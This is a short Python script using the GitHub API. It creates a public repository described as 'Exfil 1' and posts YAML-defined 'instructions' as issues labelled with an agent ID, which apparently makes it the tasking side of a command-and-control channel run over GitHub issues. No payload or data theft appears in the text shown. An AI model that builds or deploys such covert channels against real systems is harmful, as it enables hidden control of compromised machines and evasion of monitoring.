
from github import Github
from github.GithubException import GithubException
from github.GithubObject import NotSet
from uuid import uuid4
from yaml import load, dump, scanner

def checkRepoExists(user,repo_name):
	repo=None
	try:
		repo=user.get_repo(repo_name)
		print("Repo {} exists".format(repo.name))
	except GithubException as ge:
		print("Unable to find Repo: status:{}, data:{}".format(ge.status,ge.data))

	return repo

def createRepo(user,repo):
	repo=None
	try:
		print("Creating repo {}...".format(repo))
		repo=user.create_repo(repo, description="Exfil 1", 
			homepage=NotSet, private=False, has_issues=True, 
			has_wiki=False, has_downloads=True, auto_init=True, gitignore_template=NotSet)
		print("Created repo {}...".format(repo.name))
		return repo
			
	except GithubException as ge:
		print("Unable to create repo {}...".format(repo))
		print("status:{}, data:{}".format(ge.status,ge.data))

def createIssue(agentid, repo, reqfile):
	try:
		stream = file(reqfile, 'r')
		instructions=load(stream)
		print(dump(instructions))

		issue_title=instructions["issue"]["title"]
		issue_body=instructions["issue"]["body"]
		issue_label=agentid

		repo.create_issue(title=issue_title, body=issue_body, labels=[issue_label])	
	except IOError as ioe:
		print("Error: {}".format(ioe))
	except scanner.ScannerError as yse:
		print("Error: {}".format(yse))


